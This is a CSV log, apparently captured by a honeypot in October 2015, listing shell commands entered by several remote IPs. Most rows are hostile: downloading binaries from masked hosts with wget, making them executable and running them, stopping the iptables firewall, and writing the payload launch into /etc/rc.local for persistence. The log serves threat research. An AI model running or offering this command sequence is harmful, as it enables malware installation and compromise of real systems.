ip,timestamp,input
"59.46.10.155","2015-10-29 17:41:38","echo \"/etc/init.d/iptables stop\">>/etc/rc.local"
"222.186.21.105","2015-10-29 18:38:29","wget -c http://***.***.***.***/44.rar"
"222.186.21.105","2015-10-29 18:38:35","chmod 777 44.rar"
"222.186.21.105","2015-10-29 18:38:41","./44.rar &"
"59.46.10.155","2015-10-29 20:27:17","free -m"
"131.161.130.84","2015-10-29 20:43:45","echo -n test"
"131.161.130.84","2015-10-29 20:47:13","echo -n test"
"59.46.10.155","2015-10-29 20:52:33","service iptables stop"
"59.46.10.155","2015-10-29 20:52:37","wget http://***.***.***.***/scmcc"
"59.46.10.155","2015-10-29 20:52:49","chmod 777 scmcc"
"59.46.10.155","2015-10-29 20:52:53","./scmcc"
"59.46.10.155","2015-10-29 20:52:57","chmod 0755 /tmp/scmcc"
"59.46.10.155","2015-10-29 20:53:02","nohup /tmp/scmcc &gt"
"59.46.10.155","2015-10-29 20:53:02","/dev/null 2&gt"
"59.46.10.155","2015-10-29 20:53:02","&amp"
"59.46.10.155","2015-10-29 20:53:02","1 &amp"
"59.46.10.155","2015-10-29 20:53:05","chmod 0777 scmcc"
"59.46.10.155","2015-10-29 20:53:09","chmod u+x scmcc"
"59.46.10.155","2015-10-29 20:53:13","./scmcc &"
"59.46.10.155","2015-10-29 20:53:17","chmod u+x scmcc"
"59.46.10.155","2015-10-29 20:53:21","./scmcc &"
"59.46.10.155","2015-10-29 20:53:25","cd /tmp"
"59.46.10.155","2015-10-29 20:53:30","service iptables stop"
"59.46.10.155","2015-10-29 20:53:34","wget http://***.***.***.***/scmcc"
"59.46.10.155","2015-10-29 20:53:49","./164"
"59.46.10.155","2015-10-29 20:53:53","chmod 0755 /tmp/scmcc"
"59.46.10.155","2015-10-29 20:53:57","nohup /tmp/scmcc &gt"
"59.46.10.155","2015-10-29 20:53:57","/dev/null 2&gt"
"59.46.10.155","2015-10-29 20:53:58","&amp"
"59.46.10.155","2015-10-29 20:53:58","1 &amp"
"59.46.10.155","2015-10-29 20:54:01","chmod 0777 scmcc"
"59.46.10.155","2015-10-29 20:54:05","chmod u+x scmcc"
"59.46.10.155","2015-10-29 20:54:09","./scmcc &"
"59.46.10.155","2015-10-29 20:54:13","chmod u+x dos6cc4"
"59.46.10.155","2015-10-29 20:54:17","./scmcc &"
"59.46.10.155","2015-10-29 20:54:21","cd /tmp"
"59.46.10.155","2015-10-29 20:54:25","echo \"cd  /tmp/\">>/etc/rc.local"
"59.46.10.155","2015-10-29 20:54:29","echo \"./scmcc&\">>/etc/rc.local"
"59.46.10.155","2015-10-29 20:54:33","echo \"./scmcc&\">>/etc/rc.local"
"59.46.10.155","2015-10-29 20:54:37","echo \"/etc/init.d/iptables stop\">>/etc/rc.local"
